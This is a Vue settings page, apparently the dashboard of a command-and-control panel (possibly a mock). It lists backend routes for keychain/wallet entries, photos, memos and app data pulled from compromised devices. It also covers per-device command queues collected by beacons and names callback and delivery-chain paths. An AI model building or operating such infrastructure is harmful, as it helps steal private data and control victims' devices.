<script setup lang="ts">
import { computed, onMounted } from 'vue'
import { useUiStore } from '@/stores/ui'
import { useAuthStore } from '@/stores/auth'
import { useDashStore } from '@/stores/dash'
import { useCommandStore } from '@/stores/command'
import { ElMessage } from 'element-plus'

const ui = useUiStore()
const auth = useAuthStore()
const dash = useDashStore()
const cmd = useCommandStore()

const intervals = [
  { label: '1 秒', value: 1000 },
  { label: '2 秒（默认）', value: 2000 },
  { label: '5 秒', value: 5000 },
  { label: '10 秒', value: 10000 },
]

/** 接口地图：按信息架构分组（业务实体 / 运营 / 指令 / 会话） */
const apiMap = [
  { g: '业务实体（入库解析）', p: '/api/data/memos', m: 'GET', d: '备忘录实体（nb 解析）' },
  { g: '业务实体（入库解析）', p: '/api/data/wallets', m: 'GET', d: '钥匙串：按设备 → 钱包 → 条目' },
  { g: '业务实体（入库解析）', p: '/api/data/photos', m: 'GET', d: '照片实体（ph 包索引）' },
  { g: '业务实体（入库解析）', p: '/api/file/{packet_id}', m: 'GET', d: '原始字节流（照片预览/下载）' },
  { g: '业务实体（入库解析）', p: '/panel/api/apps', m: 'GET', d: '应用资产（u 解析，分页检索）' },
  { g: '业务实体（入库解析）', p: '/panel/api/notes', m: 'GET', d: '备忘录 DB 视图（分页检索）' },
  { g: '业务实体（入库解析）', p: '/panel/api/war', m: 'GET', d: '钥匙串平铺行（keychain items）' },
  { g: '运营', p: '/__dash/api', m: 'GET', d: '主数据口：设备 / PE / 钱包 / 日志 / 访问 / 计数' },
  { g: '运营', p: '/panel/api/devices', m: 'GET', d: '设备台账' },
  { g: '运营', p: '/panel/api/progress', m: 'GET', d: '交付进度（阶段权重）' },
  { g: '运营', p: '/panel/api/{access,visits}', m: 'GET', d: '访问审计 / 来访去重' },
  { g: '运营', p: '/__q/timeline/{ip}', m: 'GET', d: '设备时间线' },
  { g: '指令', p: '/__control', m: 'GET', d: 'peek：全局队列 + 各设备队列总览' },
  { g: '指令', p: '/__control', m: 'POST', d: '{type,params,once,targets[]} 批量按设备武装' },
  { g: '指令', p: '/__control', m: 'POST', d: '{command:null,target} 只取消该设备待发' },
  { g: '指令', p: '/__q/device_command_targets', m: 'GET', d: '各设备队列总览（Go v7+）' },
  { g: '指令', p: '/__q/device_commands?target=', m: 'GET', d: '单设备队列明细（Go v7+）' },
  { g: '指令', p: '/__q/commands', m: 'GET', d: '指令历史' },
  { g: '会话', p: '/__auth/{login,logout,me}', m: 'POST/GET', d: '会话（HttpOnly Cookie）' },
]

/** 后端能力探测结果 */
const caps = computed(() => [
  { name: '业务实体解析面 /api/data/*', ok: true },
  { name: '按设备独立指令队列（Go v7+）', ok: cmd.perDevice !== false },
  { name: '主数据口 /__dash/api', ok: !!dash.snap.ts },
  { name: '只读查询面 /__q/*', ok: !!dash.snap.ts },
])

function resetLocal() {
  try {
    localStorage.removeItem('mockc2.ui.v1')
    ElMessage.success('已清除本地偏好，刷新后生效')
  } catch {
    ElMessage.warning('无法访问 localStorage')
  }
}

onMounted(() => {
  void cmd.refreshTargets()
})
</script>

<template>
  <div class="st">
    <!-- 视图偏好 -->
    <section class="app-card">
      <div class="app-card__head">
        <h3 class="app-card__title"><el-icon><Setting /></el-icon>视图偏好</h3>
        <span class="t-3" style="font-size: var(--fs-xs)">本地持久化（localStorage）</span>
      </div>
      <div class="app-card__body">
        <div class="form">
          <div class="form__row">
            <span class="form__label">主题</span>
            <el-radio-group v-model="ui.theme" size="small">
              <el-radio-button value="dark">深色科技</el-radio-button>
              <el-radio-button value="light">浅色企业</el-radio-button>
            </el-radio-group>
          </div>
          <div class="form__row">
            <span class="form__label">表格密度</span>
            <el-radio-group v-model="ui.density" size="small">
              <el-radio-button value="comfortable">标准</el-radio-button>
              <el-radio-button value="compact">紧凑</el-radio-button>
            </el-radio-group>
          </div>
          <div class="form__row">
            <span class="form__label">轮询间隔</span>
            <el-select v-model="ui.refreshMs" size="small" style="width: 160px">
              <el-option v-for="i in intervals" :key="i.value" :label="i.label" :value="i.value" />
            </el-select>
          </div>
          <div class="form__row">
            <span class="form__label">自动刷新</span>
            <el-switch v-model="ui.autoRefresh" size="small" inline-prompt active-text="开" inactive-text="停" />
            <span class="t-3" style="font-size: var(--fs-xs)">页面不可见时自动暂停，恢复可见立即补拉</span>
          </div>
          <div class="form__row">
            <span class="form__label">侧栏</span>
            <el-switch v-model="ui.collapsed" size="small" inline-prompt active-text="收起" inactive-text="展开" />
            <el-button link size="small" @click="resetLocal">清除本地偏好</el-button>
          </div>
        </div>
      </div>
    </section>

    <div class="grid two">
      <!-- 运行时 -->
      <section class="app-card">
        <div class="app-card__head">
          <h3 class="app-card__title"><el-icon><Odometer /></el-icon>运行时</h3>
        </div>
        <div class="app-card__body">
          <div class="kv">
            <div>
              <span>会话</span>
              <b :class="auth.authed ? 's-ok' : 's-err'">{{ auth.authed ? '已登录' : '未登录' }}</b>
            </div>
            <div><span>后端数据时间</span><b class="mono">{{ dash.snap.ts || '-' }}</b></div>
            <div>
              <span>最近成功拉取</span>
              <b class="mono">{{ dash.lastOkAt ? new Date(dash.lastOkAt).toLocaleTimeString('zh-CN') : '-' }}</b>
            </div>
            <div>
              <span>待发指令 / 已发</span>
              <b class="mono">{{ cmd.pendingTotal }} / {{ cmd.dispatchedTotal }}</b>
            </div>
            <div><span>轮询</span><b class="mono">{{ ui.autoRefresh ? ui.refreshMs + 'ms' : '已暂停' }}</b></div>
          </div>
        </div>
      </section>

      <!-- 后端能力 -->
      <section class="app-card">
        <div class="app-card__head">
          <h3 class="app-card__title"><el-icon><Cpu /></el-icon>后端能力探测</h3>
        </div>
        <div class="app-card__body">
          <div class="kv">
            <div v-for="c in caps" :key="c.name">
              <span>{{ c.name }}</span>
              <b :class="c.ok ? 's-ok' : 's-warn'">{{ c.ok ? '可用' : '不支持' }}</b>
            </div>
          </div>
          <p class="t-3" style="font-size: var(--fs-xs); margin-top: var(--sp-3)">
            按设备独立队列需要 Go 版（device_commands 表）。Python 版或无该表的旧 Go 版会自动降级为全局单队列，
            对应页面会给出提示。
          </p>
        </div>
      </section>
    </div>

    <!-- 红线 -->
    <section class="app-card">
      <div class="app-card__head">
        <h3 class="app-card__title"><el-icon><WarnTriangleFilled /></el-icon>契约红线</h3>
      </div>
      <div class="app-card__body">
        <ul class="rules">
          <li v-for="(r, i) in [
            '前端不得修改后端代码；数据能力缺口走契约申请',
            '前端不得代理样本静态路径（/boot.html、/B10/*、/A8/*）——那是真实交付链',
            '只能访问 /__dash、/__q、/panel、/api 等只读运维接口',
            '禁止 fetch 回传端点（/beacon /war /p /result /event /u /nb /ph /a）',
            '指令只做武装 / 清空 / peek；分发由设备自己的 beacon 领走',
            'exit 不下发：会终止设备端 c2_agent 的 beacon 循环且不可恢复',
          ]" :key="i">
            <span class="rules__n num">{{ String(i + 1).padStart(2, '0') }}</span>
            <span>{{ r }}</span>
          </li>
        </ul>
      </div>
    </section>

    <!-- 接口地图 -->
    <section class="app-card">
      <div class="app-card__head">
        <h3 class="app-card__title"><el-icon><Link /></el-icon>后端接口地图</h3>
        <span class="t-3" style="font-size: var(--fs-xs)">同源相对路径，无 CORS</span>
      </div>
      <div class="app-card__body app-card__body--flush">
        <el-table :data="apiMap" size="small" row-key="p">
          <el-table-column prop="g" label="分组" width="170">
            <template #default="{ row }"><span class="chip">{{ row.g }}</span></template>
          </el-table-column>
          <el-table-column prop="m" label="方法" width="80">
            <template #default="{ row }"><span class="chip">{{ row.m }}</span></template>
          </el-table-column>
          <el-table-column prop="p" label="路径" min-width="300">
            <template #default="{ row }"><span class="mono t-2 break-all">{{ row.p }}</span></template>
          </el-table-column>
          <el-table-column prop="d" label="说明" min-width="260">
            <template #default="{ row }"><span class="t-2">{{ row.d }}</span></template>
          </el-table-column>
        </el-table>
      </div>
    </section>
  </div>
</template>

<style scoped>
.st {
  display: flex;
  flex-direction: column;
  gap: var(--sp-4);
}
.two {
  grid-template-columns: repeat(auto-fit, minmax(380px, 1fr));
}
.form {
  display: flex;
  flex-direction: column;
  gap: var(--sp-4);
}
.form__row {
  display: flex;
  align-items: center;
  gap: var(--sp-4);
}
.form__label {
  width: 88px;
  flex: none;
  color: var(--text-2);
  font-size: var(--fs-sm);
}
.kv {
  display: flex;
  flex-direction: column;
}
.kv > div {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: var(--sp-3);
  padding: 6px 0;
  border-bottom: 1px dashed var(--border);
}
.kv span {
  color: var(--text-3);
  font-size: var(--fs-sm);
}
.kv b {
  font-weight: 600;
}
.rules {
  margin: 0;
  padding: 0;
  list-style: none;
  display: flex;
  flex-direction: column;
  gap: var(--sp-3);
}
.rules li {
  display: flex;
  gap: var(--sp-3);
  font-size: var(--fs-sm);
  color: var(--text-2);
  line-height: 1.65;
}
.rules__n {
  color: var(--c-warn);
  font-size: var(--fs-xs);
  padding-top: 2px;
}
</style>
